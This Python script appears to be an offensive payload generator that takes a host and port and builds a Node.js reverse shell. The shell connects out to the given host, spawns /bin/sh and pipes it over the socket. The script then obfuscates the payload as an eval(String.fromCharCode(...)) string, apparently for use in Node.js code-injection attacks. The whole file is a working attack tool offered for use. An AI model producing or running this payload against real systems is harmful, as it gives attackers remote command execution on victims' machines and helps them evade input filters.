#!/usr/bin/python3
import sys

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " <revhost> <revport>")
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]

def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print("[+] Reverse host = " + IP_ADDR)
print("[+] Reverse port = " + PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="''' + IP_ADDR + '''";
PORT="''' + PORT + '''";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
'''
print("[+] Unencoded shell: \n" + NODEJS_REV_SHELL)
print("[+] Encoding\n")
payload = charencode(NODEJS_REV_SHELL)
print("eval(String.fromCharCode(" + payload + "))\n")

